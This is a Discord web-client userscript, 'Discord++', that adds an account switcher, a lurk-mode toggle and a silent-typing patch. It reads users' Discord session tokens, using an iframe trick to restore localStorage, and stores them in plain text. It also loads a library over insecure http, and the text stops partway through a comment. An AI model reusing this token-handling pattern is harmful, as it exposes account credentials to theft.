// ==UserScript==
// @name Discord++ | Take your discord web experience to the next level
// @version 1.2.9.6
// @iconURL   https://i.ibb.co/7znt13j/30162036.png
// @namespace https://greasyfork.org/en/users/735799
// @license      MIT
// @updateURL    https://github.com/FoxsCode/DiscordPlus/raw/main/Discord%2B%2B.user.js
// @downloadURL  https://github.com/FoxsCode/DiscordPlus/raw/main/Discord%2B%2B.user.js
// @name:es Discord++ | Lleva tu experiencia de discord web al siguiente nivel
// @name:ja Discord++ |「DISCORD」Webエクスペリエンスを次のレベルに引き上げる
// @name:fr Discord++ | Faites passer votre expérience Web Discord au niveau supérieur
// @name:ko Discord++ | Take your Discord web experience to the next level
// @name:zh-CN Discord++ | 使您的discord web体验更上一层楼
// @name:zh-TW Discord++ | 使您的discord web體驗更上一層樓
// @name:pt Discord++ | Leve sua experiência de discórdia na web para o próximo nível
// @name:pt-PT Discord++ | Leve sua experiência de discórdia na web para o próximo nível
// @name:pt-BR Discord++ | Leve sua experiência de discórdia na web para o próximo nível
// @name:ro Discord++ | Luați experiența dvs. web discord la nivelul următor
// @name:ru Discord++ | Поднимите свой опыт работы с Discord в Интернете на новый уровень
// @name:it Discord++ | Porta la tua esperienza web con Discord al livello successivo
// @author @FoxCode
// @description Discord++ adds tons of features to your web browser discord! Custom backgrounds, Account-Switcher, Log deleted messages, custom colors, smooth and new animations, better optimization, no rate limits, and much much more! It also comes with it's own theme (it can be disabled).
// @description:es ¡Discord ++ agrega toneladas de características a discord web! Fondos personalizados, registro de mensajes eliminados, colores personalizados, animaciones nuevas y suaves, mejor optimización, sin límites de velocidad y mucho más. También viene con su propio tema (se puede desactivar).
// @description:ja Discord ++はあなたのウェブブラウザの不和にたくさんの機能を追加します！ カスタム背景、ログ削除されたメッセージ、カスタムカラー、スムーズで新しいアニメーション、より良い最適化、レート制限なし、その他多数！ また、独自のテーマが付属しています（無効にすることができます）。
// @description:fr Discord ++ ajoute des tonnes de fonctionnalités à la discorde de votre navigateur Web! Arrière-plans personnalisés, journal des messages supprimés, couleurs personnalisées, animations fluides et nouvelles, meilleure optimisation, aucune limite de débit et bien plus encore! Il est également livré avec son propre thème (il peut être désactivé).
// @description:ko Discord ++는 웹 브라우저의 discord에 수많은 기능을 추가합니다! 사용자 정의 배경, 로그 삭제 메시지, 사용자 정의 색상, 매끄럽고 새로운 애니메이션, 더 나은 최적화, 속도 제한 없음, 그리고 훨씬 더! 또한 자체 테마와 함께 제공됩니다 (비활성화 할 수 있음).
// @description:zh-CN Discord ++为您的Web浏览器的不和谐添加了许多功能！ 自定义背景，记录已删除的消息，自定义颜色，平滑和新的动画，更好的优化，无速率限制等等！ 它还带有它自己的主题（可以禁用）。
// @description:zh-TW Discord ++為您的Web瀏覽器的不和諧添加了許多功能！ 自定義背景，記錄已刪除的消息，自定義顏色，平滑和新的動畫，更好的優化，無速率限制等等！ 它還帶有它自己的主題（可以禁用）。
// @description:pt-BR Discord ++ adiciona toneladas de recursos à discórdia do seu navegador da web! Planos de fundo personalizados, logs de mensagens excluídos, cores personalizadas, animações novas e suaves, melhor otimização, sem limites de taxa e muito, muito mais! Ele também vem com seu próprio tema (pode ser desativado).
// @description:pt-PT Discord ++ adiciona toneladas de recursos à discórdia do seu navegador da web! Planos de fundo personalizados, logs de mensagens excluídos, cores personalizadas, animações novas e suaves, melhor otimização, sem limites de taxa e muito, muito mais! Ele também vem com seu próprio tema (pode ser desativado).
// @description:pt Discord ++ adiciona toneladas de recursos à discórdia do seu navegador da web! Planos de fundo personalizados, logs de mensagens excluídos, cores personalizadas, animações novas e suaves, melhor otimização, sem limites de taxa e muito, muito mais! Ele também vem com seu próprio tema (pode ser desativado).
// @description:ro Discord ++ adaugă multe funcții discordiei browserului dvs. web! Fundaluri personalizate, jurnale de mesaje șterse, culori personalizate, animații netede și noi, optimizare mai bună, fără limite de rată și multe altele! De asemenea, vine cu propria temă (poate fi dezactivată).
// @description:ru Discord ++ добавляет множество функций в Discord вашего веб-браузера! Пользовательские фоны, удаленные журналы сообщений, пользовательские цвета, плавная и новая анимация, улучшенная оптимизация, отсутствие ограничений по скорости и многое другое! Он также имеет собственную тему (ее можно отключить).
// @description:it Discord ++ aggiunge tonnellate di funzionalità alla discordia del tuo browser web! Sfondi personalizzati, registri dei messaggi eliminati, colori personalizzati, animazioni nuove e fluide, migliore ottimizzazione, nessun limite di velocità e molto altro ancora! Inoltre viene fornito con il proprio tema (può essere disabilitato).
// @grant        GM_registerMenuCommand
// @grant        GM_unregisterMenuCommand
// @grant none
// @match        https://discordapp.com/activ*
// @match        https://discordapp.com/channel*
// @match        https://discord.com/activ*
// @match        https://discord.com/channel*
// @match        https://discord.com/channels/*
// @include https://discord.com/*
// @require https://greasyfork.org/scripts/21927-arrive-js/code/arrivejs.js?version=198809
// @require http://code.jquery.com/jquery-latest.js
// @require      https://cdn.jsdelivr.net/lodash/4.17.2/lodash.min.js
// @require      https://code.jquery.com/jquery-3.1.1.min.js
// ==/UserScript==
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| @grant compatibility |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
function GM_addStyle(aCss) {
  var head = document.getElementsByTagName('head')[0];
  if (head) {
    var style = document.createElement('style');
    style.setAttribute('type', 'text/css');
    style.textContent = aCss;
    head.appendChild(style);
    return style;
  }
  return null;
}

const GM_log = console.log;

// This naive implementation will simply fail to do cross-domain requests,
// just like any javascript in any page would.
function GM_xmlhttpRequest(aOpts) {
  var req = new XMLHttpRequest();

  __setupRequestEvent(aOpts, req, 'abort');
  __setupRequestEvent(aOpts, req, 'error');
  __setupRequestEvent(aOpts, req, 'load');
  __setupRequestEvent(aOpts, req, 'progress');
  __setupRequestEvent(aOpts, req, 'readystatechange');

  req.open(aOpts.method, aOpts.url, !aOpts.synchronous,
      aOpts.user || '', aOpts.password || '');
  if (aOpts.overrideMimeType) {
    req.overrideMimeType(aOpts.overrideMimeType);
  }
  if (aOpts.headers) {
    for (var prop in aOpts.headers) {
      if (Object.prototype.hasOwnProperty.call(aOpts.headers, prop)) {
        req.setRequestHeader(prop, aOpts.headers[prop]);
      }
    }
  }
  var body = aOpts.data ? aOpts.data : null;
  if (aOpts.binary) {
    return req.sendAsBinary(body);
  } else {
    return req.send(body);
  }
}

function __setupRequestEvent(aOpts, aReq, aEventName) {
  if (!aOpts['on' + aEventName]) return;

  aReq.addEventListener(aEventName, function(aEvent) {
    var responseState = {
      responseText: aReq.responseText,
      responseXML: aReq.responseXML,
      readyState: aReq.readyState,
      responseHeaders: null,
      status: null,
      statusText: null,
      finalUrl: null
    };
    switch (aEventName) {
      case "progress":
        responseState.lengthComputable = aEvent.lengthComputable;
        responseState.loaded = aEvent.loaded;
        responseState.total = aEvent.total;
        break;
      case "error":
        break;
      default:
        if (4 != aReq.readyState) break;
        responseState.responseHeaders = aReq.getAllResponseHeaders();
        responseState.status = aReq.status;
        responseState.statusText = aReq.statusText;
        break;
    }
    aOpts['on' + aEventName](responseState);
  });
}

const __GM_STORAGE_PREFIX = [
    '', GM_info.script.namespace, GM_info.script.name, ''].join('***');

// All of the GM_*Value methods rely on DOM Storage's localStorage facility.
// They work like always, but the values are scoped to a domain, unlike the
// original functions.  The content page's scripts can access, set, and
// remove these values.  A
function GM_deleteValue(aKey) {
  localStorage.removeItem(__GM_STORAGE_PREFIX + aKey);
}

function GM_getValue(aKey, aDefault) {
  var val = localStorage.getItem(__GM_STORAGE_PREFIX + aKey);
  if (null === val && 'undefined' != typeof aDefault) return aDefault;
  return val;
}

function GM_listValues() {
  var prefixLen = __GM_STORAGE_PREFIX.length;
  var values = [];
  var i = 0;
  for (var i = 0; i < localStorage.length; i++) {
    var k = localStorage.key(i);
    if (k.substr(0, prefixLen) === __GM_STORAGE_PREFIX) {
      values.push(k.substr(prefixLen));
    }
  }
  return values;
}

function GM_setValue(aKey, aVal) {
  localStorage.setItem(__GM_STORAGE_PREFIX + aKey, aVal);
}

function GM_getResourceURL(aName) {
  return 'greasemonkey-script:' + GM_info.uuid + '/' + aName;
}
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Multiple Accounts ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
(function() {
    'use strict';
    const v = "1.6";
    const apiPrefix = "https://discord.com/api/v8";
    let neededClasses = [];
    let functionKeeper = webpackJsonp[0][1];

    let classesContain = [
        ["menu","scroller","styleFixed","styleFlexible","item","hideInteraction","customItem","labelContainer","label","subtext","iconContainer","icon","hintContainer","imageContainer","caret","image","disabled","separator","submenuContainer","submenuPaddingContainer","submenu","colorDefault","checkbox","radioSelection","check","focused","colorBrand","colorDanger","colorPremium","groupLabel"],
        ["statusItem","status","icon","description","customStatusItem","customStatusWithEmoji","customEmoji","customEmojiPlaceholder","customText","clearStatusButton","clearStatusIcon"],
        ["layerContainer","layer","layerHidden","disabledPointerEvents"],
        ["backdrop","backdropWithLayer"],
        ["backdrop","layer"],
        ["responsiveWidthMobile","innerPadding","focusLock","root","small","medium","large","fullscreenOnMobile","footer","header","separator","content","close","hideOnFullscreen"],
        ["artHeight","emojiSize","emojiMargin","formGroup","modalRoot","inputContainer","modalCloseButton","headerText","emojiButton","fullOpacity","emojiButtonContainer","emoji","input","clearButton","clearIcon","headerContainer","header","art","cancelButton"],
        ["_flex","_horizontal","_horizontalReverse","flex","horizontal","horizontalReverse","flexChild","flexMarginReset"],
        ["flex","alignStart","alignEnd","alignCenter","alignStretch","alignBaseline","justifyStart","justifyEnd","justifyCenter","justifyAround","justifyBetween","noWrap","wrap","wrapReverse","directionRow","directionRowReverse","directionColumn","spacer","vertical","horizontal","horizontalReverse","flexCenter"],
        ["button","lookFilled","colorBrand","spinnerItem","lookInverted","lookOutlined","lookGhost","lookLink","contents","hoverBrand","hasHover","colorGrey","hoverGrey","colorRed","hoverRed","colorGreen","hoverGreen","colorYellow","hoverYellow","colorLink","hoverLink","colorWhite","hoverWhite","colorBlack","hoverBlack","colorPrimary","hoverPrimary","colorTransparent","hoverTransparent","lookBlank","sizeTiny","sizeSmall","sizeMedium","sizeLarge","sizeXlarge","sizeMin","sizeMax","sizeIcon","grow","fullWidth","submitting","spinner","disabledButtonWrapper","disabledButtonOverlay"],
        ["scrollerBase","thin","fade","scrolling","auto","none","content","disableScrollAnchor"],
        ["container","downloadProgressCircle","guilds","base","sidebar","hasNotice","panels","content","activityPanel","hiddenOnMobileStore"],
        ["notice","colorDefault","button","colorNeutral","colorDownload","colorNotification","colorDark","colorPremium","colorPremiumTier1","colorPremiumTier2","colorInfo","colorSuccess","colorDanger","colorStreamerMode","colorSpotify","platformIcon","colorBrand","colorCustom","closeButton","buttonMinor"],
    ];
    let ccSet = [];
    for (let i = 0; i < classesContain.length; i++) {
        const element = classesContain[i];
        ccSet.push(new Set(element));
    }
    for (const key in functionKeeper) {
        if (functionKeeper.hasOwnProperty(key)) {
            const element = functionKeeper[key];
            let ans = {};
            element(ans);
            ans = ans.exports;
            if(ans != undefined || ans != null){
                ans = Object.keys(ans);
                let a = new Set(ans);
                for (let j = 0; j < ccSet.length; j++) {
                    const element2 = ccSet[j];
                    if(eqSet(element2, a)){
                        neededClasses[j] = key;
                    }
                }
            }
        }
    }
    function eqSet(as, bs) {
        if (as.size !== bs.size) return false;
        for (var a of as) if (!bs.has(a)) return false;
        return true;
    }
    let allClasses = {};
    const createElm = (html) => {
        const temp = document.createElement('div');
        temp.innerHTML = html;
        return temp.removeChild(temp.firstElementChild);
        //webpackJsonp[0][1][neededClasses[0]].toString(); is the way
    }
    const insertCss = (css) => {
        const style = document.createElement('style');
        style.appendChild(document.createTextNode(css));
        document.head.appendChild(style);
        return style;
    }
    insertCss(`.customAccount {background-image: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0iI0I5QkJCRSIgd2lkdGg9IjE4cHgiIGhlaWdodD0iMThweCI+PHBhdGggZD0iTTAgMGgyNHYyNEgweiIgZmlsbD0ibm9uZSIvPjxwYXRoIGQ9Ik0xNiAxMWMxLjY2IDAgMi45OS0xLjM0IDIuOTktM1MxNy42NiA1IDE2IDVjLTEuNjYgMC0zIDEuMzQtMyAzczEuMzQgMyAzIDN6bS04IDBjMS42NiAwIDIuOTktMS4zNCAyLjk5LTNTOS42NiA1IDggNUM2LjM0IDUgNSA2LjM0IDUgOHMxLjM0IDMgMyAzem0wIDJjLTIuMzMgMC03IDEuMTctNyAzLjVWMTloMTR2LTIuNWMwLTIuMzMtNC42Ny0zLjUtNy0zLjV6bTggMGMtLjI5IDAtLjYyLjAyLS45Ny4wNSAxLjE2Ljg0IDEuOTcgMS45NyAxLjk3IDMuNDVWMTloNnYtMi41YzAtMi4zMy00LjY3LTMuNS03LTMuNXoiLz48L3N2Zz4=);background-size: contain;background-repeat: no-repeat;}
               .changeAccount {grid-area: icon;margin-left: -2px;width: 16px;height: 16px;}
               .accountChooserContainer {display: flex;height: 70px;}
               .accountChooserAvatar {border-radius: 50%; align-self: center;height: 80%;}
               .accountName {align-self: center;font-size: x-large;font-weight: 400;color: var(--interactive-active);}
               .accountLogin {margin-left: auto;align-self: center;padding: 8px 20px;background-color: #43b581;font-weight: 900;color: #fff;border-radius: 5px;}
               .accountLogin:hover {background-color: #3ca374;}
               .accountDiscriminator{align-self: center;margin-top: 7px;color: var(--header-secondary);}
               #addAccount{margin-left: auto;margin: 10px auto;color: var(--header-secondary);cursor: pointer;}
               #addAccount:hover{text-decoration: underline;}
               .versionNotifier {background-color: #6b1ba7;}
               #changeLogButtonClick:hover {color: #6b1ba7;}
        `);
    function parseAllClasses(){
        for (var i = 0; i < neededClasses.length; i++) {
            let x = {};
            webpackJsonp[0][1][neededClasses[i]](x);
            allClasses[neededClasses[i]] = x.exports;
        }
        console.log(allClasses);
    }
    window.onclick = () => {
        let cont = document.getElementsByClassName(allClasses[neededClasses[0]].scroller);
        if(cont.length > 0 && !document.getElementById("status-picker-account")){
            cont[0].appendChild(createElm(`<div role="separator" class="${allClasses[neededClasses[0]].separator}"></div>`));
            let elmnt = createElm(`<div class="${allClasses[neededClasses[0]].item} ${allClasses[neededClasses[0]].colorDefault}" aria-disabled="false" role="menuitem" id="status-picker-account" tabindex="-1"><div class="${allClasses[neededClasses[1]].statusItem}" aria-label="Set a custom status"><div class="changeAccount customAccount"></div><div class="${allClasses[neededClasses[1]].status}">Change account</div></div></div>`);
            elmnt.onmouseover = () => {
                let allElmnts = document.getElementsByClassName(allClasses[neededClasses[0]].item);
                for (var i = 0; i < allElmnts.length; i++) {
                    allElmnts[i].classList.remove(allClasses[neededClasses[0]].focused);
                }
                elmnt.classList.add(allClasses[neededClasses[0]].focused);
            }
            elmnt.onmouseleave = () => {
                let allElmnts = document.getElementsByClassName(allClasses[neededClasses[0]].item);
                for (var i = 0; i < allElmnts.length; i++) {
                    allElmnts[i].classList.remove(allClasses[neededClasses[0]].focused);
                }
            }
            elmnt.onclick = openPicker;
            cont[0].appendChild(elmnt);
        }
        if(localStorage.versionMA != 69 && !document.getElementsByClassName("versionNotifier")[0]){
            let baseElement = document.getElementsByClassName(allClasses[neededClasses[11]].base);
            if(baseElement[0]){
                baseElement[0].prepend(createElm(`<div class="${allClasses[neededClasses[12]].notice} ${allClasses[neededClasses[12]].colorDefault} versionNotifier"><div class="${allClasses[neededClasses[12]].closeButton}" id="versionNotifierCloseButton" aria-label="Dismiss" role="button" tabindex="0"></div>Multiple Discord Accounts ${v} makes corners rounder!<button id="changeLogButtonClick" class="${allClasses[neededClasses[12]].button}">View changes</button></div>`));
                document.getElementById("changeLogButtonClick").onclick = () => {
                    window.open("https://github.com/cazeip/MultipleAccounts/blob/master/changes.md");
                    document.getElementsByClassName("versionNotifier")[0].remove();
                    localStorage.versionMA = 1;
                }
                document.getElementById("versionNotifierCloseButton").onclick = () => {
                    document.getElementsByClassName("versionNotifier")[0].remove();
                    localStorage.versionMA = 1;
                }
            }
        }
    }
    function getUserInfo(){
        window.dispatchEvent(new Event('beforeunload'));
        let currentToken = JSON.parse(localStorage.getItem("token"));
        return fetch(apiPrefix + "/users/@me", {
            headers: {
                Accept: "*/*",
                "Accept-Language": "en-US",
                Authority: "discordapp.com",
                Authorization: currentToken,
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.301 Chrome/56.0.2924.87 Discord/1.6.15 Safari/537.36",
            },
            method: "GET",
        }).then((res) => (res.status === 200 ? res.json() : Promise.resolve()))
          .catch(console.error);
    }
    function getUser(userID){
        window.dispatchEvent(new Event('beforeunload'));
        let currentToken = JSON.parse(localStorage.getItem("token"));
        return fetch(apiPrefix + "/users/"+userID, {
            headers: {
                Accept: "*/*",
                "Accept-Language": "en-US",
                Authority: "discordapp.com",
                Authorization: currentToken,
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.301 Chrome/56.0.2924.87 Discord/1.6.15 Safari/537.36",
            },
            method: "GET",
        }).then((res) => (res.status === 200 ? res.json() : Promise.resolve()))
          .catch(console.error);
    }
    async function fillLocalStorage(){
        let info = await getUserInfo();
        window.dispatchEvent(new Event('beforeunload'));
        info.token = JSON.parse(localStorage.getItem("token"));
        localStorage.setItem("multipleAccounts", JSON.stringify([{id:info.id, token: info.token}]));
    }
    function apiCall(apiPath, body, method = "GET"){
        window.dispatchEvent(new Event('beforeunload'));
        let currentToken = JSON.parse(localStorage.getItem("token"));
        return fetch(apiPrefix + apiPath, {
            body: body ? JSON.stringify(body) : undefined,
            headers: {
                Accept: "*/*",
                "Accept-Language": "en-US",
                Authority: "discordapp.com",
                Authorization: currentToken,
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.301 Chrome/56.0.2924.87 Discord/1.6.15 Safari/537.36",
            },
            method,
        }).then((res) => (res.status === 200 ? res.json() : Promise.resolve()))
          .catch(console.error);
    }
    function changeAccount(newToken){
        window.dispatchEvent(new Event('beforeunload'));
        let token = JSON.parse(localStorage.token);
        window.location.href = "http://discord.com/login";
        localStorage.token = "\""+newToken+"\"";
        if (newToken == "--[LogIn]--") {
            localStorage.removeItem("token");
        }
    }
    async function openPicker(){
        if(localStorage.getItem("multipleAccounts") == null || localStorage.getItem("multipleAccounts") == undefined){
            await fillLocalStorage();
        }else{
            let info = await getUserInfo();
            let localSt = JSON.parse(localStorage.getItem("multipleAccounts"));
            let def = false;
            for (let i = 0; i < localSt.length; i++) {
                if(localSt[i].id === info.id){
                    def = true;
                }
            }
            if(!def){
                localSt.push({id: info.id, token: JSON.parse(localStorage.getItem("token"))});
            }
            localStorage.setItem("multipleAccounts", JSON.stringify(localSt));
        }
        let info = JSON.parse(localStorage.getItem("multipleAccounts"));
        if(document.getElementById("accountPickerModal")) return;
        let a = document.getElementsByClassName(allClasses[neededClasses[2]].layerContainer);
        let y = createElm(`<div id="accountPickerBg" class="${allClasses[neededClasses[3]].backdropWithLayer}" style="opacity: 0; background-color: rgb(0, 0, 0); transform: translateZ(0px);transition: opacity 0.2s;"></div>`);
        y.onclick = closePicker;
        a[a.length - 1].appendChild(y);
        let x = createElm(`<div class="${allClasses[neededClasses[4]].layer}" id="accountPickerModal"> <div class="${allClasses[neededClasses[5]].focusLock}" role="dialog" aria-label="Set a custom status" tabindex="-1" aria-modal="true"> <div class="${allClasses[neededClasses[6]].modalRoot} ${allClasses[neededClasses[5]].root} ${allClasses[neededClasses[5]].small} ${allClasses[neededClasses[5]].fullscreenOnMobile}" id="animatedModal" style="opacity: 0;transform: scale(0.2);transition: transform .2s, opacity .2s;"> <div class="${allClasses[neededClasses[7]].flex} ${allClasses[neededClasses[7]]._horizontal} ${allClasses[neededClasses[8]].justifyStart} ${allClasses[neededClasses[8]].alignCenter} ${allClasses[neededClasses[8]].noWrap} ${allClasses[neededClasses[5]].header} ${allClasses[neededClasses[6]].headerContainer}" id="replaceBackground" style="flex: 0 0 auto;background-position: bottom;background-size: cover;background-image: url(https://cdn.discordapp.com/attachments/768475463524941865/768481090087944233/pawel-nolbert-4u2U8EO9OzY-unsplash.jpg);padding: 30px;"> <div class="${allClasses[neededClasses[6]].header}" style="padding-top: 0;"><h4 class="${allClasses[neededClasses[6]].headerText}">Choose a Discord account</h4></div><button id="closeXbutton" aria-label="Close" type="button" class="${allClasses[neededClasses[5]].close} ${allClasses[neededClasses[6]].modalCloseButton} ${allClasses[neededClasses[9]].button} ${allClasses[neededClasses[9]].lookBlank} ${allClasses[neededClasses[9]].colorBrand} ${allClasses[neededClasses[9]].grow}"> <div class="${allClasses[neededClasses[9]].contents}"> <svg aria-hidden="false" width="24" height="24" viewBox="0 0 24 24"><path fill="currentColor" d="M18.4 4L12 10.4L5.6 4L4 5.6L10.4 12L4 18.4L5.6 20L12 13.6L18.4 20L20 18.4L13.6 12L20 5.6L18.4 4Z"></path></svg> </div></button> </div><div id="accountLinesContainer" class="${allClasses[neededClasses[5]].content} ${allClasses[neededClasses[10]].thin}" dir="ltr" style="overflow: hidden scroll; padding-right: 8px; padding-top: 10px;"></div><span id="addAccount">Not seeing your account? Click here to add one.</span></div></div></div>`);
        a[a.length - 1].appendChild(x);
        document.getElementById("closeXbutton").onclick = closePicker;
        document.getElementsByClassName(allClasses[neededClasses[2]].layer)[0].style.display = "none";
        document.getElementById("addAccount").onclick = () => {
            changeAccount("--[LogIn]--");
        }
        setTimeout(async () => {
            document.getElementById("accountPickerBg").style.opacity = "0.85";
            document.getElementById("animatedModal").style.transform = "scale(1)";
            document.getElementById("animatedModal").style.opacity = "1";
            for (let i = 0; i < info.length; i++) {
                let line;
                let user = await getUser(info[i].id);
                if(user.avatar == null){
                    line = createElm(`<div class="accountChooserContainer"><img class="accountChooserAvatar" src="https://cdn.discordapp.com/embed/avatars/${user.discriminator % 5}.png"><div style="margin-left: 20px;align-self: center;display: flex;flex-direction: column;"><div><span class="accountName">${user.username}</span><span class="accountDiscriminator">#${user.discriminator}</span></div><span style="color: var(--text-muted);padding-top: 2px;padding-left: 0;">ID: ${user.id}</span></div><button id="AccountSwitchButton${i}" class="accountLogin">Log in</button></div>`);
                }else{
                    line = createElm(`<div class="accountChooserContainer"><img class="accountChooserAvatar" src="https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png?size=128"><div style="margin-left: 20px;align-self: center;display: flex;flex-direction: column;"><div><span class="accountName">${user.username}</span><span class="accountDiscriminator">#${user.discriminator}</span></div><span style="color: var(--text-muted);padding-top: 2px;padding-left: 0;">ID: ${user.id}</span></div><button id="AccountSwitchButton${i}" class="accountLogin">Log in</button></div>`);
                }
                document.getElementById("accountLinesContainer").appendChild(line);
                document.getElementById("AccountSwitchButton"+i).onclick = () => {
                    changeAccount(info[i].token);
                }
            }
        }, 100);
    }
    function closePicker(){
        document.getElementById("accountPickerBg").style.opacity = "0";
        document.getElementById("animatedModal").style.transform = "scale(0.2)";
        document.getElementById("animatedModal").style.opacity = "0";
        setTimeout( () => {
            document.getElementById("accountPickerBg").remove();
            document.getElementById("accountPickerModal").remove();
        }, 201);
    }
    window.localStorage = document.body.appendChild(document.createElement('iframe')).contentWindow.localStorage;
    parseAllClasses();
})();
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Lurk-Mode Switch |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
function createBox() {
    if (document.getElementsByTagName('textarea')[0] || document.querySelector(".markup-2BOw-j.slateTextArea-1Mkdgw")){
        var frag = document.createDocumentFragment();
        var outDiv = document.createElement("DIV");
        outDiv.className = "lurkDiv";
        var outLabel = document.createElement("LABEL");
        outLabel.className = "lurkSwitch";
        var outSpan = document.createElement("SPAN");
        outSpan.className = "lurkSlider round";
        var checkBox = document.createElement("input");
        checkBox.type = "checkbox";
        checkBox.id = "checker";
        var style = document.createElement("style");
        var sheet = document.head.appendChild(style).sheet;
        sheet.insertRule('.lurkSwitch {position: relative; display: inline-block; width: 25px; height: 15px;}',sheet.cssRules.length);
        sheet.insertRule('.lurkSwitch input {display:none;}',sheet.cssRules.length);
        sheet.insertRule('.lurkSlider {position: absolute;cursor: pointer;top: 0;left: 0;right: 0;bottom: 0;background-color: var(--Color005);-webkit-transition: .2s;transition: .2s;}',sheet.cssRules.length);
        sheet.insertRule('.lurkSlider:before {position: absolute;content: "";height: 15px; width: 15px;left: 0px;bottom: 0px;background-color: #262A2D;-webkit-transition: .2s;transition: .2s;}',sheet.cssRules.length);
        sheet.insertRule('input:checked + .lurkSlider {background-color: white;}',sheet.cssRules.length);
        sheet.insertRule('input:focus + .lurkSlider.round {box-shadow: 0px 0px 0px 3px white;}',sheet.cssRules.length);
        sheet.insertRule('input:checked + .lurkSlider.round {box-shadow: 0px 0px 0px 3px white;}',sheet.cssRules.length);
        sheet.insertRule('input:checked + .lurkSlider:before {background-color: var(--Color005); -webkit-transform: translateX(10px);-ms-transform: translateX(10px);transform: translateX(10px);}',sheet.cssRules.length);
        sheet.insertRule('.lurkSlider.round {box-shadow: 0px 0px 0px 3px var(--Color005); border-radius: 100px;}',sheet.cssRules.length);
        sheet.insertRule('.lurkSlider.round:before {border-radius: 100%;}',sheet.cssRules.length);
        sheet.insertRule('.lurkDiv {z-index: 999; position: absolute; left: 342px; top: 500px;}',sheet.cssRules.length);
        frag.appendChild(outDiv);
        outDiv.appendChild(outLabel);
        outLabel.appendChild(checkBox);
        outLabel.appendChild(outSpan);
        var appFront = document.getElementById('app-mount');
        appFront.parentNode.insertBefore(frag, appFront.nextSibling);
    } else {
        setTimeout(createBox,1000);
    }
}

function recheck(){
    var messageBox = document.querySelector(".markup-2BOw-j.slateTextArea-1Mkdgw");
    var preMessageBox = document.getElementsByTagName('textarea')[0];
    if (messageBox) {
        if (document.getElementById('checker').checked === true) {
            messageBox.setAttribute('contentEditable', false);
            messageBox.setAttribute("style", "outline: none; white-space: pre-wrap; overflow-wrap: break-word;");
        } else {
            messageBox.setAttribute('contentEditable', true);
            messageBox.setAttribute("style", "outline: none; white-space: pre-wrap; overflow-wrap: break-word; -webkit-user-modify: none;");
        }
    }
    if (preMessageBox) {
        if (document.getElementById('checker').checked === true) {
            preMessageBox.setAttribute('disabled', true);
        } else {
            preMessageBox.removeAttribute('disabled');
        }
    }
}

window.addEventListener("load", createBox, false);
window.addEventListener("click", recheck, false);

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Silent Typing ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
(function () {
    "use strict";

    let cancel = null;

    const start = function () {
        const module = WebpackModules.findByUniqueProperties(["startTyping"]);
        if (!module) {
            console.error("SilentTyping:", "unable to monkey patch sendTyping method");
            return;
        }
        cancel = monkeyPatch(module, "startTyping", {instead: ()=>{}});
    };

    const stop = function () {
        if (cancel) {
            cancel();
            cancel = null;
        }
    };

    /**
     * Function with no arguments and no return value that may be called to reverse changes that is done by {@link monkeyPatch} method, restoring (unpatching) original method.
     * @callback cancelPatch
     */

    /**
     * This is a shortcut for calling original method using this and arguments from data object. This is a function without input arguments. This function is defined as `() => data.returnValue = data.originalMethod.apply(data.thisObject, data.methodArguments)`
     * @callback originalMethodCall
     * @return {*} The same value, which is returned from original method, also this value would be written into `data.returnValue`
     */

    /**
     * A callback that modifies method logic. Callback is called on each call of original method and have all data about original call. Any of the data can be modified if you need, but do it wisely.
     * @callback doPatchCallback
     * @param {PatchData} data Data object with all information about current that you may need in your patching callback.callback.
     * @return {*} Makes sense only when used as `instead` parameter in {@link monkeyPatch}. If returned something other then undefined - it replaces value in `returnValue` param. If used as `before` or `after` parameters - return value if ignored.
     */

    /**
     * This is function for monkey-patching any object method. Can make patch before, after or instead of target method.
     * Be careful when monkey-patching. Think not only about original functionality of target method and you changes, but also about develovers of other plugins, who may also patch this method before or after you. Try to change target method behaviour little as you can, and try to never change method signatures.
     * By default this function makes log messages about each patching and unpatching, so you and other developers can see what methods a patched. This messages may be suppressed.
     * Display name of patched method is changed, so you can see if function is patched and how many times while debuging or in the stack trace. Also patched function have property `__monkeyPatched` is set to true, in case you want to check something programmatically.
     *
     * @author samogot
     * @param {object} what Object to be patched. You can can also pass class prototypes to patch all class instances. If you are patching prototype of react component you may also need {@link Renderer.rebindMethods}.
     * @param {string} methodName The name of the target message to be patched.
     * @param {object} options Options object. You should provide at least one of `before`, `after` or `instead` parameters. Other parameters are optional.
     * @param {doPatchCallback} options.before Callback that will be called before original target method call. You can modify arguments here, so it will be passed to original method. Can be combined with `after`.
     * @param {doPatchCallback} options.after Callback that will be called after original target method call. You can modify return value here, so it will be passed to external code which calls target method. Can be combined with `before`.
